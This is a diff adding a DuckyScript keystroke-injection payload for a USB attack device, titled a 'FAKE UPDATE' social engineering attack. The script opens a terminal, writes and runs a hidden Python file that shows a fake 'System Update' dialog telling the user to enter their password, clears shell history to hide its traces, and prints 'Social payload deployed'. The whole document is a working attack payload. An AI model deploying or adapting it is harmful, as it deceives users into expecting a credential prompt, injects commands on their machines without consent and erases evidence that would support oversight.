@@ -1,0 +1,69 @@
+# ============================================
+# FAKE UPDATE - Social Engineering Attack
+# ============================================
+# Purpose: Display fake system update prompt
+# Author: D3n14l0f53rv1c3
+# Original: https://github.com/i-am-shodan/USBArmyKnife
+# ============================================
+
+DELAY 1000
+
+# Open terminal
+GUI SPACE
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+
+# Create fake update window
+STRING cat > /tmp/.update.py << 'PYEOF'
+ENTER
+DELAY 100
+STRING import tkinter as tk
+ENTER
+DELAY 100
+STRING from tkinter import messagebox
+ENTER
+DELAY 100
+STRING 
+ENTER
+DELAY 100
+STRING root = tk.Tk()
+ENTER
+DELAY 100
+STRING root.withdraw()
+ENTER
+DELAY 100
+STRING 
+ENTER
+DELAY 100
+STRING messagebox.showinfo(
+ENTER
+DELAY 100
+STRING     "System Update",
+ENTER
+DELAY 100
+STRING     "Important security update available.\n\n"
+ENTER
+DELAY 100
+STRING     "Please enter your password to continue."
+ENTER
+DELAY 100
+STRING )
+ENTER
+DELAY 100
+STRING PYEOF
+ENTER
+DELAY 300
+
+STRING python3 /tmp/.update.py &
+ENTER
+DELAY 200
+
+STRING history -c
+ENTER
+STRING clear
+ENTER
+
+STRING echo "Social payload deployed"
+ENTER
